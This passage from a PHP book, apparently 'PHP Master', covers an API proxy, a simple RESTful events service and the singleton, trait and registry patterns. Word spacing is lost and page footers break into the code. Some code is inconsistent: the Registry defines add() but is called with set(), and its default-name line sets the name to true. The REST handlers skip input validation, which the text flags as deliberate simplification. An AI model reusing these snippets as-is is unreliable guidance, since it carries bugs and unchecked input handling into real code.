// Don't return HTTP headers. Do return the contents of the call
curl_setopt($curl, CURLOPT_HEADER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
// Make the call
$response = curl_exec($curl);
// Relay unsuccessful responses
$status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
if ($status >= "400") {
  header("Status: 500 Internal Server Error");PHP Master: W rite Cutting-edge Code 112
www.it-ebooks.info
}
// Set the Content-Type appropriately
header("Content-Type: " .$allowed_hosts[$requested_host] ➥
  ['mimetype']);
// Output the response
echo $response;
// Shutdown curl
curl_close($curl);
This proxy allows ustowhitelist allowed domains, inthiscase api.bit.ly ,aswell
asspecify theAPI’sprotocol (HTTP orHTTPS) anddefault arguments, such asour
private login andapiKey arguments. This way,they’re notpublicly visible inour
JavaScript source.
Assuming thisscript isinyour webroot asproxy .php,youcannow simply send an
Ajax request to/proxy .php/api.bit.ly/v3/shorten?longUrl=URL andreceive thebit.ly
APIresponse. Inthisexample, we’re going toshorten theuser’ swebsite URL after
they enter itinto aform:
chapter_03/proxy .php (excerpt)
<script type="text/javascript">
function shortenWebsiteURL(url) {
  $.AJAX(
    url: "/proxy.php/api.bit.ly/v3/shorten",
    data: {longUrl: url},
    success: function(data) {
      $('input#website').attr('value', data.url);
    }
  );
}
</script>
Aswith theearlier cURL request, theAPIresponds with aJSON value inthisway:
{ "status_code": 200, "status_txt": "OK", "data": { "long_url": ➥
  "http:\/\/lornajane.net\/", "url": 
"http:\/\/bit.ly\/nM02pD", "hash": "nM02pD", "global_hash": ➥
  "glZgTN", "new_hash": 1 } }113 APIs
www.it-ebooks.info
Ofcourse, youcanalsobuild thisintoyour existing MVC systems andtakeadvantage
oftherouting there, allowing youtouseaURL such as/proxy/api.bit.ly/v3/shorten .
Asyoucansee,with justalittle bitofeffort, JavaScript (specifically Ajax) andAPIs
getalong spectacularly well. Whether youuseittoaccess your own APIs orthose
ofsome third party ,youcanenhance your site’sexperience with ease.
Developing and Consuming RESTful Services
Perhaps themost important question here is:What isREST andwhy doIcare?
We’ve covered some widely used andperfectly adequate service formats already ,
andsince PHP users have been programming with functions foryears, wecan
probably doeverything weneed towith theRPC-style services.
REST stands forREpresentational State Transfer ,andismore than analternative
protocol. It’sanelegant andsimple way toexpose CRUD (Create, Replace, Update,
Delete) functionality foritems over HTTP .REST isdesigned tobelightweight to
take advantage ofthefeatures ofHTTP asthey were originally intended—features
such astheheaders andverbs wediscussed earlier inthischapter .
REST hasgained inpopularity over thelastfewyears, yetitisconceptually very
different tothefunction-based styles thatdevelopers aremore accustomed to;asa
result, many services described as“RESTful” are,strictly speaking, notentirely
compatible with thatdescription.
Avoid the Zealots
Whenever youpublish aRESTful service, it’slikely thatsomeone, somewhere
willcomplain thatyouhave violated oneormore principles ofREST—and they’re
probably right! REST isquite anacademic setofprinciples which doesn’t always
lend itself well tobusiness applications. Toavoid criticism, simply market your
service asanHTTP web service instead.
Each ofthevarious types ofservice thatREST offers hasitsstrengths. REST ismost
often used inservices thatarestrongly data-related, such aswhen providing the
service layer inaservice-oriented architecture. ARESTful service isoften quite a
close reflection oftheunderlying data storage inanapplication, which iswhy it’s
agood fitinthese situations. Theconcept shift asmentioned canbeanegative pointPHP Master: W rite Cutting-edge Code 114
www.it-ebooks.info
when considering building aRESTful service; some developers may find itmore
difficult towork with.
Beyond Pr etty URLs
Possibly oneofthemost eye-catching features ofRESTful services isthatthey’re
very much about URL structure. They follow astrict useofURLs, andthismeans
thatyoucaneasily seefrom theURL andwords contained within what ishappen-
ing—this isindirect contrast toRPC services, which typically have asingle endpoint.
Theemphasis onURLs isbecause everything inREST isaresource. Aresource
might bea:
■user
■product
■order
■category
InRESTful services, weseetwotypes ofURLs. Thefirst arecollections; these are
likedirectories onafilesystem, asthey contain alistofresources. Forexample, a
listofevents would have aURL such as:
http://example.com/events/
Anindividual event would have aURL with aspecific identifier associated with
it,such as:
http://example.com/events/72
When weissue aGETrequest tothisURL, we’ll receive thedata related tothisevent,
listing thename, date, andvenue. Ifthisservice exposes information about the
tickets sold fortheevent, theURL might take aformat such as:
http://example.com/events/72/tickets
This tickets URL isanother example ofacollection, andwe’d expect toseeoneor
more price items listed here.115 APIs
www.it-ebooks.info
RESTful Principles
We’ve already seen theURL structure forRESTful services, anddiscussed theway
thatHTTP isused toimplement these services. Let’stake amoment tooutline the
main characteristics ofaservice ofthistype:
■Allitems areresources, andeach resource hasitsown unique resource identifier
(URI).
■Theservice deals inrepresentations ofthese resources, which canbemanipulated
indifferent ways using HTTP verbs toindicate which action should beperformed.
■They arestateless services, where each request contains alltheinformation
needed tocomplete itsuccessfully ,anddoesn’t relyontheresource being in
anyparticular state.
■Format information andstatus messages arealltransmitted intheHTTP envelope;
anyparameters orbody content relate only tothedata under consideration.
Some ofthese ideas may become clearer aswecover examples ofbuilding and
consuming thistype ofservice.
Building a RESTful Service
Thenext fewpages cover thebuilding ofanexample RESTful service. We’llexamine
each piece ofcode inturn. Theservice isbuilt-in PHP,with example calls being
made toitusing cURL from PHP; youcould ofcourse useeither pecl_http orstreams
instead, ifyouwanted to.
Using Rewrite Rules to Redir ect to index.php
This isacommon feature ofmany modern dynamic systems; routing allrequests
toindex.php andthen parsing theURL tofigure outexactly what theuser wanted.
We’llusethesame approach inourapplication, andbring allrequests into index.php
toensure thatwealways setupandprocess thedata inthesame way.Toachieve
thisusing Apache astheweb server ,wehave thefollowing inour.htaccess file:
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{REQUEST_FILENAME} !-fPHP Master: W rite Cutting-edge Code 116
www.it-ebooks.info
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ index.php/$1 [L]
</IfModule>
Collecting Incoming Data
Tobegin with, weneed tofigure outwhat came inwith therequest, andstore that
information somewhere. Here we’re creating aRequest object, which issimply an
empty class, butusing itgives ussomewhere tokeep thevariables together ,andan
easy way toaddfunctionality later ifweneed it.Wethen check themethod that
wasused, andcapture thedata accordingly:
chapter_03/rest/index.php  (excerpt)
// initialize the request object and store the requested URL
$request = new Request();
$request->url_elements = array();
if(isset($_SERVER['PATH_INFO'])) {
  $request->url_elements = explode('/', $_SERVER['PATH_INFO']);
}
// figure out the verb and grab the incoming data
$request->verb = $_SERVER['REQUEST_METHOD'];
switch($request->verb) {
  case 'GET':
    $request->parameters = $_GET;
    break;
  case 'POST':
  case 'PUT':
    $request->parameters = json_decode(file_get_contents ➥
      ('php://input'), 1);
    break;
  case 'DELETE':
  default:
    // we won't set any parameters in these cases
    $request->parameters = array();
}
First ofall,wedissect theURL towork outwhat theuser requested. Forexample,
torequest alistofevents, theuser would make arequest likethis:117 APIs
www.it-ebooks.info
  $ch = curl_init('http://localhost/rest/events');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $response = curl_exec($ch);
  $events = json_decode($response,1);
How theparameters arrive intoourscript willdepend entirely onthemethod used
torequest, soweuseaswitch statement andpull outthearguments accordingly .
While$_GET should befamiliar ,forPOST andPUTwe’re dealing with abody ofJSON
data rather than aform, soweusethephp://input stream directly .Exactly like
when weused streams tomake web requests early inthischapter ,PHP knows how
tohandle thephp:// stream. Then weusejson_decode() toparse thedata into an
array ofkeys andvalues, justlikewe’d find in$_GET or$_POST .
Routing the Requests
Now weknow what theURL was, which parameters were supplied, andwhat
method wasused, wecanroute therequest tothecorrect piece ofcode. We’vecreated
acontroller class foreach oftheURL portions thatmight beused first after thedo-
main name, andwe’ll callafunction inside each onethatrelates tothemethod that
therequest used.
MVC and REST
Since aRESTful service follows somany oftheprinciples ofastandard MVC
pattern, wecanvery easily useonehere. While thisexample ismuch smaller than
theservices you’ll build intherealworld, youcanstillseethispattern emerging
inplaces, andthecontroller object containing actions iscertainly afamiliar ele-
ment. Youcanfind more information andexamples onMVC inChapter 4.
Therouting code forthissimple system isthis:
chapter_03/rest/index.php  (excerpt)
// route the request
if($request->url_elements) {
  $controller_name = ucfirst($request->url_elements[1]) . ➥
    'Controller';
  if(class_exists($controller_name)) {
    $controller = new $controller_name();
    $action_name = ucfirst($request->verb) . "Action";
    $response = $controller->$action_name($request);PHP Master: W rite Cutting-edge Code 118
www.it-ebooks.info
  } else {
    header('HTTP/1.0 400 Bad Request');
    $response = "Unknown Request for " . $request->url_elements[1];
  }
} else {
  header('HTTP/1.0 400 Bad Request');
  $response = "Unknown Request";
}
We’retaking thepieces oftheURL thatwesplit outearlier ,andusing thefirst one
(which iselement index 1,aselement 0will always beempty) toinform which
controller touse. Fortheexample URL http://example.com/events ,thevalue of
$controller_name becomes EventController and, since it’saGETrequest, the
$action_name isGETAction() .
This system hasavery simple autoloading function thatwill load thecontrollers
forusasweneed them (wecovered autoloading inChapter 1,sofeelfreetorefer
tothatchapter formore detail). This means thatwecansimply build thename of
theclass wewant, andthen instantiate one. Wepass therequest object into our
action sothatwecanaccess thedata wegathered earlier .
One final point tonote here isthatthiscode doesn’t echo anyoutput. Instead, it
stores thedata in$response .This issothatweavoid sending anyresponse atall
until right attheendofthescript, when wecanpass alldata through thesame
output handlers; you’ll seethisshortly .
A Note on Data Stor age
Inorder toavoid being bogged down intoomany other dependencies such as
databases, thisservice simply serializes data toatextfileforstorage (and invents
some data ifthere’ snone present!). Youwill seecalls toreadEvents() and
writeEvents() ,andthose functions areasfollows:
chapter_03/rest/eventscontroller .php (excerpt)
protected function readEvents() {
  $events = unserialize(file_get_contents($this->events_file));
  if(empty($events)) {
    // invent some event data
    $events[] = array('title' => 'Summer Concert',
      'date' => date('U', mktime(0,0,0,7,1,2012)),119 APIs
www.it-ebooks.info
      'capacity' => '150');
    $events[] = array('title' => 'Valentine Dinner',
      'date' => date('U', mktime(0,0,0,2,14,2012)),
      'capacity' => '48');
    $this->writeEvents($events);
  }
  return $events;
}
protected function writeEvents($events) {
  file_put_contents($this->events_file, serialize($events)); 
  return true;
}
Thestorage youchoose foryour service will depend entirely onyour application,
using allthesame criteria you’d usewhen choosing storage foranyother webproject.
Theserialized-array-in-a-file approach isreally only advisable for“toy” projects
likethisone.
GETting One Event or Many
When weintroduced theidea ofRESTful services, wesawthatitincluded both
resources andcollections. OurGETAction() will need tohandle requests both toa
collection andtoaspecific resource. Sowe’re expecting requests thatcould look
likeeither ofthese:
http://example.com/events
http://example.com/events/72
Making therequest happens exactly asinouroriginal example; only theURL would
change, depending onwhether youwere requesting thecontroller ortheresource.
Ontheserver side, ouraction code looks assuch:
chapter_03/rest/eventscontroller .php (excerpt)
public function GETAction($request) {
  $events = $this->readEvents();
  if(isset($request->url_elements[2]) && is_numeric ➥
    ($request->url_elements[2])) {
    return $events[$request->url_elements[2]];
  } else {PHP Master: W rite Cutting-edge Code 120
www.it-ebooks.info
    return $events;
  }
}
Wegetthelistofevents, andifaspecific onewasrequested, wereturn justthat
item, otherwise wereturn thewhole list.Ifyou’re wondering about thevalues in
$request->url_elements ,remember thatthiscame from
explode($_SERVER['PATH_INFO']) .Ifwewere toinspect theoutput ofthis—for
example, ontherequest tohttp://example.com/events/72 —we'd seethis:
Array
(
    [0] => 
    [1] => events
    [2] => 72
)
Asaresult, weusethethird element astheIDoftheevent thatwewant tofind and
return totheuser.
Creating Data with POST Requests
Tocreate data inaRESTful service, wemake aPOST request, sending data fields to
populate thenew record. Todosointhisexample, wemake thisrequest:
$item = array("title" => "Silent Auction",
  "date" => date('U', mktime(0,0,0,4,17,2012)),
  "capacity" => 210);
$data = json_encode($item);
$ch = curl_init('http://localhost/rest/events');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$response = curl_exec($ch);
$events = json_decode($response,1);
Therequest goes tothecollection, andtheservice itself willassign anIDandreturn
information about it;it’sfairly common toredirect theuser tothenew resource
location, andthatiswhat we’ve done here. Here’ sthecode:121 APIs
www.it-ebooks.info
chapter_03/rest/eventscontroller .php (excerpt)
public function POSTAction($request) {
  // error checking and filtering input MUST go here
  $events = $this->readEvents();
  $event = array();
  $event['title'] = $request->parameters['title'];
  $event['date'] = $request->parameters['date'];
  $event['capacity'] = $request->parameters['capacity'];
  $events[] = $event;
  $this->writeEvents($events);
  $id = max(array_keys($events));
  header('HTTP/1.1 201 Created');
  header('Location: /events/'. $id);
  return '';
}
Thedata comes inwith thisrequest inJSON format inourservice, andweparsed
itnear thestart ofthescript. Tokeep theexample simple, weunquestioningly accept
thedata andsave it;however ,inarealapplication we’d apply allthesame practices
thatwewould with anyother form input. Webservices follow alltheprinciples of
anyother web application, so,ifyou’re already aweb developer ,youknow what
todohere!
Theheaders here lettheclient know thattherecord wascreated successfully .Ifthe
data isinvalid, orwedetect aduplicate record, oranything elsegoes wrong, we
return anerror message. Asitis,welettheclient know wehave created therecord,
andthen redirect them towhere thatcanbefound.
Updating Resour ces with PUT
Asweturn ourattention toPUTrequests, we’re dealing with amethod thatisunfa-
miliar .WeuseGETandPOST forforms, butPUTissomething new.Infact, it’snot
allthatdifferent! Wealready sawhow toretrieve theparameters from therequest,
andonce we’ve routed therequest, thefactthatitwasoriginally aPUTrequest
doesn’t affect thecode. Therequest would bemade along these lines: first, by
fetching aparticular event (we’re using event 4asanexample), then bychanging
fields appropriately ,andthen byusingPUTtosend thechanged data back tothe
same resource URL:PHP Master: W rite Cutting-edge Code 122
www.it-ebooks.info
// get the current version of the record
$ch = curl_init('http://localhost/rest/events/4');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
$item = json_decode($response,1);
// change the title
$item['title'] = 'Improved Event';
// send the data back to the server
$data = json_encode($item);
$ch = curl_init('http://localhost/rest/events/4');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$response = curl_exec($ch);
Notice thatwe’ve sent allthefields from theresource, notjusttheones wewanted
tochange. This isstandard practice; aRESTful service only deals inrepresentations
ofwhole resources. There isnoalternative tosomething likesetTitle($newTitle)
inREST ;wecanonly operate onresources. Ourcode tohandle thisrequest is:
chapter_03/rest/eventscontroller .php (excerpt)
public function PUTAction($request) {
  // error checking and filtering input MUST go here
  $events = $this->readEvents();
  $event = array();
  $event['title'] = $request->parameters['title'];
  $event['date'] = $request->parameters['date'];
  $event['capacity'] = $request->parameters['capacity'];
  $id = $request->parameters['id'];
  $events[$id] = $event;
  $this->writeEvents($events);
  header('HTTP/1.1 204 No Content');
  header('Location: /events/'. $id);
  return '';
}
Wehope theevidence shown here backs uptheearlier claim thataPUTrequest re-
quires nospecial skills forustohandle it.This code isfairly similar tothe
POSTAction() code.123 APIs
www.it-ebooks.info
DELETE ing Recor ds
Ifyou’re stillreading, thisistheeasy bit!Todelete aresource, wesimply make a
DELETE request toitsURL. This looks similar totheother requests, butletusinclude
itforcompleteness:
$ch = curl_init('http://localhost/rest/events/3');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "DELETE");
$response = curl_exec($ch);
Reasonably straightforward, right? And ourserver -side code isalso simpler than it
hasbeen forsome oftheother actions, partly because there’ snoneed toworry about
data fields when wereceive aDELETE request. Here itis:
chapter_03/rest/eventscontroller .php (excerpt)
public function DELETEAction($request) {
  $events = $this->readEvents();
  if(isset($request->url_elements[2]) && is_numeric ➥
    ($request->url_elements[2])) {
    unset($events[$request->url_elements[2]]);
    $this->writeEvents($events);
    header('HTTP/1.1 204 No Content');
    header('Location: /events');
  }
  return '';
}
Simply put,weidentify which record should bedeleted, remove itfrom theevents
array ,andredirect theuser back totheevents list.
One aspect you’ll notice, reading thisaction andmany oftheothers, isthatthecode
ismore short-and-readable than watertight. This ispurely tomake iteasy toseethe
elements ofthescripts thatarespecific toillustrating theRESTful API. Everything
youalready know about security andhandling failure also applies toservices—so
usethose skills toowhen creating forapublic-facing server .PHP Master: W rite Cutting-edge Code 124
www.it-ebooks.info
Designing a W eb Service
There aresome keypoints tobear inmind when creating aweb service. This section
runs through some ofthemain considerations when creating anappropriate and
useful service.
Thefirst decision tomake iswhich service format you’ll use. Ifyour service is
tightly coupled torepresenting data, youmight choose aRESTful service. Forex-
changing data between machines, youmight pick XML-RPC orSOAP ,especially if
thisisanenterprise environment where youcanbeconfident thatSOAP isalready
well understood. Forfeeding asynchronous requests from JavaScript orpassing data
toamobile device, JSON might beabetter choice.
Asyouwork onyour web service, always bear inmind thatusers willpass nonsense
into theservice. This isn’t tosaythatusers areidiots, butweallsometimes misun-
derstand (oromit toread) theinstructions, orjustplain make mistakes. How your
service responds inthissituation isthemeasure ofhow good itis.Arobust and
reliable service will react tofailure inanon-damaging way andgive informative
feedback totheuser onwhat went wrong. Before wemove onfrom thistopic, the
most important point isthis: error messages should bereturned inthesame format
asthesuccessful output would arrive in.
There isadesign principle called KISS (Keep ItSimple, Stupid), andlessismore
when itcomes toAPIdesign. Takecare toavoid making awide, sprawling, and
inconsistent API. Only addfeatures when they arereally needed andbesure to
keep new functionality inlinewith theway therestoftheAPIhasbeen implemen-
ted.
Awebservice isincomplete until ithasbeen delivered with documentation. Without
thedocumentation, itishard forusers touseyour service, andmany ofthem won’t.
Good documentation removes thehurdles andallows users tobuild onthefunction-
ality youexpose—to build something wonderful oftheir own.
When itcomes down toit,exposing anAPI, either internally oraspartofaservice-
oriented internal architecture, isallabout empowering others totake advantage of
theinformation available. Whether these others aresoftware orpeople, internal or
external, thatbasic aimdoesn’t change. Thebuilding blocks ofaweb service are125 APIs
www.it-ebooks.info
thesame asthose ofaweb application, with theaddition ofafewspecific terms
andskills thatwecovered inthischapter .
Service Pr ovided
This chapter covered alotofground, andyoumay find thatyoudipinto different
sections ofitasyour needs change over aseries ofprojects. Aswell asthetheory
ofHTTP andthevarious data formats commonly used inweb services, we’ve shown
how topublish andconsume avariety ofservices, both from PHP andontheclient
side. Youcannow create robust, reusable web services, both asanelement ofthe
internal architecture ofyour system, andforexposing toexternal consumers.PHP Master: W rite Cutting-edge Code 126
www.it-ebooks.info
Chapter4
Design P atterns
Inthischapter ,you’ll learn some essential design principles thatwill form the
keystone ofmany architectural decisions you’ll make along your application’ sde-
velopment path.
Aswith therealworld, repeated tasks have best practices—you putyour clothes
through thewashing machine before sticking them inthedryer orontheclothesline,
right? Similarly ,common code architecture problems have best-practice solutions;
these areknown asdesign patterns.
What Ar e Design P atterns?
Hammer: nail. Screwdriver: screw .Youneed theright toolfortheright job.Design
patterns arereally justabunch oftools inyour toolbox; sometimes you’ll find one
thatfitsthejob,sometimes youneed tousemore than one, andsometimes youjust
need tocreate your own.
Asyoufamiliarize yourself with common design patterns, their uses will become
applicable inmore andmore situations. Intime, you’ll find yourself seeing the
patterns incode thatlend themselves toaparticular design pattern.
www.it-ebooks.info
Itisjustasimportant torecognize when touseadesign pattern asitistoknow
when nottouseone. Bemindful thatdesign patterns aren’t theanswer toevery ar-
chitecture problem.
Choosing the Right One
While notalways aperfect fit,nobody ever said thatdesign patterns arearigid one-
size-fits-all solution; youwill change them, andshape them tofitthetask athand.
Withsome patterns, thisisinherent inthevery nature oftheir application; inothers,
you’ll bechanging thepattern itself. Itisnotuncommon forpatterns tocomplement
each other andtowork intandem; they arebuilding blocks from which your applic-
ation (atleast inpart) canbebuilt.
Because design patterns follow best practice, they canbeconsidered defacto
standards. New developers coming intothecodebase willmore quickly pick upthe
code, boosting productivity .And thisisnottomention what theuseofdesign pat-
terns does forfuture development andmaintenance.
Singleton
Thefirst pattern we’ll look atisthesingleton pattern. Itensures thatwhen youin-
stantiate anobject, youinstantiate only oneinstance ofaclass, andcanthen recall
thatsame object anywhere inyour code, easily .Think ofthesingleton pattern asa
cookie jarwith only onecookie init.Youcanopen thelidofthejar,butyou’re not
allowed toeatthecookie—just enjoy itsaroma.
Withthesingleton pattern, anobject isinstantiated when youfirstcallforit(known
aslazy loading );from thatpoint on,each callwill return thesame object. The
singleton pattern isgenerally used forobjects thatrepresent resources tobeused
over andover within many different parts oftheapplication, butshould always be
thesame. Common examples might include your database connections andconfig-
uration information.
Themost important aspect ofasingleton islimiting theability tocreate instances.
Ifthisisn’t done, thepotential exists formultiple instances tobecreated, causing
havoc. This limiting capacity isachieved bymaking theconstructor private, and
having astatic function thatwilleither construct anew instance—if none exists—or
will return areference tothesingleton instance:PHP Master: W rite Cutting-edge Code 128
www.it-ebooks.info
chapter_04/Singleton.php
// The Database class represents our global DB connection
class Database extends PDO {
  // A static variable to hold our single instance
  private static $_instance = null;
  // Make the constructor private to ensure singleton
  private function __construct()
  {
    // Call the PDO constructor
    parent::__construct(APP_DB_DSN, APP_DB_USER, APP_DB_PASSWORD);
  }
  // A method to get our singleton instance
  public static function getInstance()
  {
    if (!(self::$_instance instanceof Database)) {
      self::$_instance = new Database();
    }
    return self::$_instance;
  }
}
There arethree crucial points toimplementing thesingleton:
1.Astatic member tohold oursingle instance—in thisexample, wehave aprivate
DB::$_instance property
2.Next, aprivate__construct() sothattheclass canonly beinstantiated bya
static method contained within itself
3.Forourdatabase class, theDB::getInstance() static method. When called,
DB::getInstance() will either instantiate anobject oftheDatabase class and
assign ittotheDB::$_instance property ,then return it,orsimply return the
previously instantiated object.
Tousethesingleton, because static methods areaccessible within theglobal scope,
wherever wewant adatabase connection, wecansimply callDB::getInstance() .129 Design P atterns
www.it-ebooks.info
Problems with Singletons
There areseveral problems built into thefabric ofthesingleton pattern. Thefirst
andforemost isthatwhile theidea ofasingleton seems great (who needs two
database connections?), thelimitation quickly becomes apparent asyoufind you
need asecond instance forsome new aspect ofyour software. Forexample, what
happens ifyoudecide tosplit database read/writes todifferent servers?
Add tothisthatsingletons aredesigned tohang around once anobject isinstantiated,
andunit testing becomes anightmare. Tosolve thefirst issue, youmight think to
create anabstract parentDBConnection class with aprotected constructor from
which youextend withDBWriteConnection andDBReadConnection concrete classes,
butyoueither areunable todeclare thestatic$_instance variable intheparent
class (making itlessdeclarative), orthismethod simply fails towork!
This issue iswhy youcannot declare asimple abstractSingleton class from which
allsingletons should inherit. This issue can, however ,besolved with anew PHP
feature: thetrait.
Traits
Traits areanew feature slated fortherelease ofPHP 5.4.While there arestillsome
minor issues thatneed tobeworked outwith thisfeature, itiscertainly generating
alotofexcitement. Traits are,intheir most basic form, considered tobeacompiler -
assisted copy-and-paste technique. Let’shave acloser look atwhat thatmeans for
ourcode architecture.
Traits aredefined likeclasses, except youusethetraitkeyword instead ofclass when
youdeclare them. They canthen beused within aclass definition bymaking use
ofthekeyword use:
// Define the Singleton Trait
trait Singleton {
  // A static variable to hold our single instance
  private static $_instance = null;
  // A method to get our singleton instance
  public static function getInstance()
  {PHP Master: W rite Cutting-edge Code 130
www.it-ebooks.info
    // Dynamically use the current class name
    $class = __CLASS__;
    if (!(self::$_instance instanceof __CLASS__)) {
      self::$_instance = new $class();
    }
    return self::$_instance;
  }
}
class DBWriteConnection extends PDO {
  // Use the Singleton trait
  use Singleton;
  private function __construct()
  {
     parent::__construct(APP_DB_WRITE_DSN, APP_DB_WRITE_USER, ➥
       APP_DB_WRITE_PASSWORD);
  }
}
class DBReadConnection extends PDO {
  // Use the Singleton trait
  use Singleton;
  private function __construct()
  {
     parent::__construct(APP_DB_READ_DSN, APP_DB_READ_USER, ➥
       APP_DB_READ_PASSWORD);
  }
}
While thissolves theimmediate problem ofreusing thesingleton pattern itself, it
doesn’t help ifwewant twoinstances ofthesame class atalater date. This highlights
thesingle biggest problem with singletons: they inhibit growth andreuse when
used improperly .How dowegetaround thisissue? Let’semploy theregistry pattern
instead.
Registry
Okay ,soitshares itsname with amuch-hated operating system configuration
store—but forget thatdefinition. Theregistry pattern issimply asingle global class131 Design P atterns
www.it-ebooks.info
thatallows your code toretrieve thesame instance ofanobject when youwant it,
aswell ascreating other instances when youwant them (and again, access those
instances globally ondemand).
Theregistry isyour own personal object library …without allthefussoftheDewey
Decimal System. Youcancheck objects inandcheck them outagain whenever you
want to,without thefearofperformance penalties ifyouhang ontothem fortoo
long.
Thesimplest way tothink oftheregistry pattern isasakey/value store, with the
keybeing anidentifier foraninstance ofanobject, andthevalue being theinstance
itself. Thepattern comes intoplay when youneed tomanage thisarray ofkey/value
pairs, store theinstances onfirst instantiation, andreturn areference tothesame
instance onrequest.
Aswith singletons, theregistry pattern isused foraccessing globally reusable objects;
thedifference isthattheregistry isn’t responsible forcreating theobjects, butpurely
maintaining theglobal store, andcanhold anynumber ofinstances ofthesame
class. This makes itperfect forthetwoscenarios welooked atwith thesingleton
pattern—database connections andconfiguration objects—with twousages ofour
registry class.
Ourregistry implementation hasfour methods:
1.Registry::set() —adds anobject totheregistry; youcanspecify aname (for
multiple instances) oritwill usetheclass name bydefault (forsingleton-like
behavior)
2.Registry::get() —retrieves anobject from theregistry byname
3.Registry::contains() —checks ifanobject exists intheregistry
4.Registry::unset() —removes anobject from theregistry byname
Here’ show these four methods might look contained within ourRegistry class:
chapter_04/Registr y.php
class Registry {
  /**
   * @var array The store for all of our objectsPHP Master: W rite Cutting-edge Code 132
www.it-ebooks.info
   */
  static private $_store = array();
  
  /**
   * Add an object to the registry
   * 
   * If you do not specify a name the class name is used
   *
   * @param mixed $object The object to store
   * @param string $name Name used to retrieve the object
   * @return mixed If overwriting an object, the previous object ➥
       will be returned.
   * @throws Exception
   */
  static public function add($object, $name = null)
  {
    // Use the class name if no name given, simulates singleton
    $name = (!is_null($name)) ?: get_class($object);
    $name = strtolower($name);
    
    $return = null;
    if (isset(self::$_store[$name])) {
      // Store the old object for returning
      $return = self::$_store[$name];
    }
    
    self::$_store[$name]= $object;
    return $return;
  }
  
  /**
   * Get an object from the registry
   *
   * @param string $name Object name, {@see self::set()}
   * @return mixed
   * @throws Exception
   */
  static public function get($name)
  {
    if (!self::contains($name)) {
      throw new Exception("Object does not exist in registry");
    }
    
    return self::$_store[$name];
  }133 Design P atterns
www.it-ebooks.info
  
  /**
   * Check if an object is in the registry
   *
   * @param string $name Object name, {@see self::set()}
   * @return bool
   */
  static public function contains($name)
  {
    if (!isset(self::$_store[$name])) {
      return false;
    }
    
    return true;
  }
  
  /**
   * Remove an object from the registry
   *
   * @param string $name Object name, {@see self::set()}
   * @returns void
   */
  static public function remove($name)
  {
    if (self::contains($name)) {
      unset(self::$_store[$name]);
    }
  }
} 
Once wehave ourRegistry class, wecanuseitinoneoftwoways: externally ,or
internally .Let’slook atthecode foradatabase connection using both methods.
First, externally: asconsumers ofthedatabase class, we’ll instantiate aninstance
andaddittoourregistry:
chapter_04/Registr y-DB-external.php
$read = new DBReadConnection;
Registry::set($read);
$write = new DBWriteConnection;
Registry::set($write);PHP Master: W rite Cutting-edge Code 134
www.it-ebooks.info
// To get the instances, anywhere in our code:
$read = Registry::get('DbReadConnection');
$write = Registry::get('DbWriteConnection');
Inthisinstance, weusetheshortcut ofnotpassing inthename, andcanthen pull
theobject from theregistry using theclass name. This means theobject isavailable
anywhere theRegistry class isaccessible.
Thesecond method, internally ,refers tocode similar tothatused with oursingleton
pattern; ituses theRegistry tostore andretrieve thedifferent connections inside
theclass itself. Theconsumer doesn’t interact with theRegistry directly:
chapter_04/Registr y-DB-internal.php
abstract class DBConnection extends PDO {
  static public function getInstance($name = null)
  {
    // Get the late-static-binding version of __CLASS__
    $class = get_called_class();
    // Allow passing in a name to get multiple instances
    // If you do not pass a name, it functions as a singleton
    $name = (!is_null($name)) ?: $class;
    if (!Registry::contains($name)) {
      $instance = new $class();
      Registry::set($instance, $name);
    }
    return Registry::get($name);
  }
}
class DBWriteConnection extends DBConnection {
  public function __construct()
  {
     parent::__construct(APP_DB_WRITE_DSN, APP_DB_WRITE_USER, ➥
       APP_DB_WRITE_PASSWORD);
  }
}
class DBReadConnection extends DBConnection {
  public function __construct()
  {
     parent::__construct(APP_DB_READ_DSN, APP_DB_READ_USER, ➥135 Design P atterns
www.it-ebooks.info
       APP_DB_READ_PASSWORD);
  }
}
Withthiscode, andasprinkling oflatestatic binding goodness,1wecanhave our
abstract parent with theshared code, while allowing formultiple, completely sep-
arate instances asneeded. Toutilize ourcode, wejustcall
DBConnection::getInstance() oneither oftheread orwrite connection classes,
likeso:
// Get the singleton Read connection
$read_db = DBReadConnection::getInstance();
// Get the singleton Write connection
$write_db = DBWriteConnection::getInstance();
// Get a new DBReadConnection for another purpose
$news_db = DBReadConnection::getInstance(‘news-db’);
Insome ways, thisisamixture ofthesingleton pattern andournext pattern: the
factory pattern.
Registering Some Pr oblems
Each ofthese ways ofusing theregistry hasitsown issues. Withtheexternal re-
gistry ,youcannot lazy load; thatis,youmust initialize each object intheregistry
before it’sneeded. Ifyour order ofoperations becomes complex, youwill miss
thisandhitunexpected errors.
Withtheinternal method, youneed toconsider constructor arguments—if you
don’t pass them through, you’ll have theexact same object each time; justdifferent
instances ofit.
1Late static binding wasafeature introduced with PHP 5.3.Itallows ustoinherit static methods from
aparent class, andtoreference thechild class being called. This means youcanhave anabstract class
with static methods, andreference thechild class’ sconcrete implementations byusing the
static::method() notation instead oftheself::method() .PHP Master: W rite Cutting-edge Code 136
www.it-ebooks.info
Factory
Thefactory pattern manufactures objects, justlikeitssteel-and-concrete namesake
intheworld ofindustry .Typically ,itisused toinstantiate different concrete imple-
mentations ofthesame abstract class orinterface.
While itisrarely employed inageneric manner ,thefactory pattern isperfect for
instantiating oneofmany variants inadriver -based setup, such asdifferent storage
engines foryour configuration, sessions, orcache. Thebiggest value inthefactory
pattern isthatitcanencapsulate what would normally bealotofobject setup into
asingle, simple method call. Forexample, when setting upalogger object, youneed
tosetupthelogtype (file-based, MySQL, orSQLite, forexample), loglocation, and,
potentially ,items likecredentials.
Thefactory pattern isused toaugment thenewoperator when you’re instantiating
